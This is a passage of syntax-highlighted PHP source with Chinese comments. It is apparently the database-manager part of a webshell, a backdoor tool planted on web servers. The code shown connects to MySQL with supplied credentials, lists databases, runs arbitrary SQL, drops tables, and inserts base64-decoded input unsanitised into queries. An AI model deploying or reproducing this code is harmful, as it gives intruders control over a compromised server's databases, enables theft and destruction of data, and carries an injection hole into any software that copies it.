</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (q(&#34;DROP TABLE $tablename&#34;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Drop table of success&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $tablename = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(mysql_error());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;title&#39; =&gt; &#39;MYSQL Manager&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;DBHost:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;dbhost&#39;, &#39;size&#39; =&gt; 20, &#39;value&#39; =&gt; $dbhost));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;dbport&#39;, &#39;size&#39; =&gt; 4, &#39;value&#39; =&gt; $dbport));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;DBUser:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;dbuser&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $dbuser));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;DBPass:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;dbpass&#39;, &#39;size&#39; =&gt; 15, &#39;value&#39; =&gt; $dbpass));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;DBCharset:&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeselect(array(&#39;name&#39; =&gt; &#39;charset&#39;, &#39;option&#39; =&gt; $charsetdb, &#39;selected&#39; =&gt; $charset, &#39;nokey&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makeinput(array(&#39;name&#39; =&gt; &#39;connect&#39;, &#39;value&#39; =&gt; &#39;Connect&#39;, &#39;type&#39; =&gt; &#39;submit&#39;, &#39;class&#39; =&gt; &#39;bt&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    //操作记录
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;recordlist&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;doing&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;base64&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;tablename&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    //选定数据库
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;setdbname&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (!$dbname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dbname&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    //选定表
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;settable&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;tablename&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;page&#39;, $page);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;doing&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $cachetables = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $pagenum = 30;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $page = intval($page);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($page) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $start_limit = ($page - 1) * $pagenum;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $start_limit = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $page = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (isset($dbhost) &amp;&amp; isset($dbuser) &amp;&amp; isset($dbpass) &amp;&amp; isset($connect)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        //获取数据库信息
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $mysqlver = mysql_get_server_info();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;p&gt;MySQL &#39; . $mysqlver . &#39; running in &#39; . $dbhost . &#39; as &#39; . $dbuser . &#39;@&#39; . $dbhost . &#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $highver = $mysqlver &gt; &#39;4.1&#39; ? 1 : 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        //获取数据库
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $query = q(&#34;SHOW DATABASES&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbs = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dbs[] = &#39;-- Select a database --&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        while ($db = mysql_fetch_array($query)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dbs[$db[&#39;Database&#39;]] = $db[&#39;Database&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makeselect(array(&#39;title&#39; =&gt; &#39;Please select a database:&#39;, &#39;name&#39; =&gt; &#39;db[]&#39;, &#39;option&#39; =&gt; $dbs, &#39;selected&#39; =&gt; $dbname, &#39;onchange&#39; =&gt; &#39;moddbname(this.options[this.selectedIndex].value)&#39;, &#39;newline&#39; =&gt; 1));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $tabledb = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($dbname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;Current dababase: &lt;a href=&#34;javascript:moddbname(\&#39;&#39; . $dbname . &#39;\&#39;);&#34;&gt;&#39; . $dbname . &#39;&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($tablename) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39; | Current Table: &lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;);&#34;&gt;&#39; . $tablename . &#39;&lt;/a&gt; [ &lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;insert\&#39;);&#34;&gt;Insert&lt;/a&gt; | &lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;structure\&#39;);&#34;&gt;Structure&lt;/a&gt; | &lt;a href=&#34;javascript:settable(\&#39;&#39; . $tablename . &#39;\&#39;, \&#39;drop\&#39;);&#34;&gt;Drop&lt;/a&gt; ]&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            mysql_select_db($dbname);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $getnumsql = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $runquery = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($sql_query) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $runquery = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $allowedit = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($tablename &amp;&amp; !$sql_query) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $sql_query = &#34;SELECT * FROM $tablename&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $getnumsql = $sql_query;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $sql_query = $sql_query . &#34; LIMIT $start_limit, $pagenum&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $allowedit = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;POST&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;&lt;p&gt;&lt;table width=&#34;200&#34; border=&#34;0&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34;&gt;&lt;tr&gt;&lt;td colspan=&#34;2&#34;&gt;Run SQL query/queries on database &#39; . $dbname . &#39;:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name=&#34;sql_query&#34; class=&#34;area&#34; style=&#34;width:600px;height:50px;overflow:auto;&#34;&gt;&#39; . htmlspecialchars($sql_query, ENT_QUOTES) . &#39;&lt;/textarea&gt;&lt;/td&gt;&lt;td style=&#34;padding:0 5px;&#34;&gt;&lt;input class=&#34;bt&#34; style=&#34;height:50px;&#34; name=&#34;submit&#34; type=&#34;submit&#34; value=&#34;Query&#34; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            makehide(&#39;tablename&#39;, $tablename);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            p(&#39;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($tablename || ($runquery &amp;&amp; $sql_query)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($doing == &#39;structure&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $result = q(&#34;SHOW FULL COLUMNS FROM $tablename&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $rowdb = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    while ($row = mysql_fetch_array($result)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $rowdb[] = $row;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;h3&gt;Structure&lt;/h3&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;table border=&#34;0&#34; cellpadding=&#34;3&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Field&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Type&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Collation&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Null&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Key&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Default&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Extra&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Privileges&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Comment&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    foreach ($rowdb as $row) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Field&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Type&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Collation&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Null&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Key&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Default&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Extra&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Privileges&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Comment&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    tbfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $result = q(&#34;SHOW INDEX FROM $tablename&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $rowdb = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    while ($row = mysql_fetch_array($result)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $rowdb[] = $row;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;h3&gt;Indexes&lt;/h3&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;table border=&#34;0&#34; cellpadding=&#34;3&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Keyname&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Type&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Unique&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Packed&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Seq_in_index&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Field&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Cardinality&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Collation&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Null&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Comment&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    foreach ($rowdb as $row) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Key_name&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Index_type&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . ($row[&#39;Non_unique&#39;] ? &#39;No&#39; : &#39;Yes&#39;) . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . ($row[&#39;Packed&#39;] === null ? &#39;No&#39; : $row[&#39;Packed&#39;]) . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Seq_in_index&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Column_name&#39;] . ($row[&#39;Sub_part&#39;] ? &#39;(&#39; . $row[&#39;Sub_part&#39;] . &#39;)&#39; : &#39;&#39;) . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . ($row[&#39;Cardinality&#39;] ? $row[&#39;Cardinality&#39;] : 0) . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Collation&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Null&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $row[&#39;Comment&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    tbfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } elseif ($doing == &#39;insert&#39; || $doing == &#39;edit&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $result = q(&#39;SHOW COLUMNS FROM &#39; . $tablename);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    while ($row = mysql_fetch_array($result)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $rowdb[] = $row;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $rs = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if ($doing == &#39;insert&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;h2&gt;Insert new line in &#39; . $tablename . &#39; table »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;h2&gt;Update record in &#39; . $tablename . &#39; table »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $where = base64_decode($base64);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $result = q(&#34;SELECT * FROM $tablename WHERE $where LIMIT 1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $rs = mysql_fetch_array($result);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;form method=&#34;post&#34; action=&#34;&#39; . $self . &#39;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    makehide(&#39;tablename&#39;, $tablename);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;table border=&#34;0&#34; cellpadding=&#34;3&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    foreach ($rowdb as $row) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        if ($rs[$row[&#39;Field&#39;]]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            $value = htmlspecialchars($rs[$row[&#39;Field&#39;]]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            $value = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        if ($row[&#39;Key&#39;] == &#39;UNI&#39; || $row[&#39;Extra&#39;] == &#39;auto_increment&#39; || $row[&#39;Key&#39;] == &#39;PRI&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            p(&#39;&lt;td&gt;&lt;b&gt;&#39; . $row[&#39;Field&#39;] . &#39;&lt;/b&gt;&lt;br /&gt;&#39; . $row[&#39;Type&#39;] . &#39;&lt;/td&gt;&lt;td&gt;&#39; . $value . &#39; &lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        } else {
